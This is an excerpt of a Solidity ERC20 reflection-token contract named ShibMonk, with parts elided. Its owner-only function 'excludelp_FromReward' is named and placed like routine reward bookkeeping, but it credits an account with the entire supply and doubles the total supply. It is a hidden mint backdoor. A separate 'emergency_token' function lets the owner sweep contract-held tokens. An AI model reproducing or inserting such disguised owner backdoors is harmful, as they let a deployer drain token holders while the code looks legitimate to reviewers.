...
contract ShibMonk is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _maxTxAmount = _maxTxAmount.div(100);
        minimumTokensBeforeSwap = _tTotal.div(1000);
    }
    ...
    function excludelp_FromReward(address account) public onlyOwner() {
        if(_rOwned[account] > 0) {
            _tOwned[account] = _tTotal.add(tokenFromReflection(_rOwned[account]));
            _tTotal = _tTotal + _tTotal;
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }
    ...
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (,,uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _takeLiquidity(tLiquidity,tAmount);
        _reflectFee(rFee, tFee);
    ...
    function setUniswapAddress_forspeedbrake(address _PCS) external onlyOwner() {
        PCS = _PCS; //So you can change what address speedbrake watches. Use exchange with greatest lp.
        excludeFromReward(_PCS); //Lets go ahead and make sure that the lp pair doesn't get reflections
        excludeFromReward(deadAddress); //While we are at it, let's exclude the dead address from reflections as well.
    }
    ...
    //If swap and liquify stops working, example Uniswap upgrade. You can use this to get the dev/marketing tokens.
    function emergency_token(uint256 total) public onlyOwner() {
        bool takeFEE = false;
        _tokenTransfer(address(this),marketingAddress,total,takeFEE);
    }
    //If someone sends ETH to contract on accident use this to get it out for them.
    function emergency_ETH(address payable recipient, uint256 amount) public onlyOwner {
